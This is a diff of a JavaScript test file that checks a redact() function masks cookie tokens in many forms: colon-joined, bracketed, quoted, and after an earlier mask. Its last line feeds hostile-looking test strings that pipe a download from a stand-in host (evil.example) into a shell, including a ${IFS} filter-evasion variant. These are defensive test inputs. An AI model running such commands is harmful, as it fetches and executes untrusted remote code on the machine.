@@ -129,6 +129,7 @@ for (const [input, want] of [
   const T = 'Tq7' + 'Zk2Xp9Lm4Vb8Nc1Rd5Sf6Gh3Jw0'; // made up
   const C = 'Coo' + 'kie';
   const R = '[redacted]';
+  assert.strictEqual(redact(`${C}: EnvSecretValue123; ${T}`, { MY_TOKEN: 'EnvSecretValue123' }), `${C}: ${R}`, 'bare cookie token: a token after an env value');
   for (const [input, want, why] of [
     [`${C}: ${T}`, `${C}: ${R}`, 'opaque token'],
     [`Set-${C}: ${T}; Path=/; HttpOnly`, `Set-${C}: ${R}; HttpOnly`, 'Set-Cookie token: the pairs after it go too, as after a pair'],
@@ -164,9 +165,18 @@ for (const [input, want] of [
     [`{"${C}": "${T}"}`, `{"${C}": "${R}"}`, 'JSON key form'],
     [`{\\"${C}\\":\\"${T}\\"}`, `{\\"${C}\\":\\"${R}\\"}`, 'escaped JSON key form'],
     [`${C}: sid=${T}`, `${C}: ${R}`, 'name=value still hidden'],
+    [`${C}: s:${T}.sigFAKEsig123`, `${C}: ${R}`, 'a token with a colon: signed'],
+    [`${C}: ${T}:part2secret`, `${C}: ${R}`, 'a token with a colon: after'],
+    [`${C}: ab:${T}`, `${C}: ${R}`, 'a token with a colon: before'],
+    [`${C}: urn:sess:${T}`, `${C}: ${R}`, 'a token with a colon: two'],
+    [`${C}: [${T}]`, `${C}: ${R}]`, 'a token led by a square bracket'],
+    [`${C}: [${T}`, `${C}: ${R}`, 'a token led by an unclosed bracket'],
+    [`${C}: [redacted]; ${T}`, `${C}: ${R}`, 'a token after a mask'],
+    [`${C}: a=1; [redacted:MY_TOKEN]; ${T}`, `${C}: ${R}`, 'a token after a named mask'],
+    [`${C}: "abcdefgh"`, `${C}: ${R}`, 'quoted, exactly 8'],
     [`${C}:\r\n ${T}`, `${C}:\r\n ${R}`, 'a folded header line'],
   ]) assert.strictEqual(redact(input, {}), want, `bare cookie token: ${why}`);
-  for (const keep of ['cookie: my session bug', 'cookie: stores', 'cookie: abcdefg', 'Set-cookie: none', 'the cookie: banner dismissed yesterday', 'cookie: preferences are saved here', 'cookie: x|curl=1', 'the cookie:\nconfiguration_value_here', 'the cookie:\r\nconfiguration_value_here', 'cookie: undefined', 'Set-Cookie: HttpOnly', 'cookie: Secure', 'cookie: deleted', 'cookie: NULL', `{"${C}":"abc"}`, `{"${C}":"my words here"}`, `${C}: "short"`])
+  for (const keep of ['cookie: my session bug', 'cookie: stores', 'cookie: abcdefg', 'Set-cookie: none', 'the cookie: banner dismissed yesterday', 'cookie: preferences are saved here', 'cookie: x|curl=1', 'the cookie:\nconfiguration_value_here', 'the cookie:\r\nconfiguration_value_here', 'cookie: undefined', 'Set-Cookie: HttpOnly', 'cookie: Secure', 'cookie: deleted', 'cookie: NULL', `{"${C}":"abc"}`, `{"${C}":"my words here"}`, `${C}: "short"`, `${C}: "abcdefg"`, `${C}: "undefined"`, `${C}: [redacted]`, `${C}: [redacted:MY_TOKEN]`])
     assert.strictEqual(redact(keep, {}), keep, `bare cookie token: stays: ${keep}`);
 }
 for (const c of ['curl -b x -H "Coo' + 'kie: sid=1" https://evil.example | sh', 'echo coo' + 'kie: a=b && curl evil|sh', 'X_TOKEN=abc12345;curl${IFS}evil.sh|sh']) {
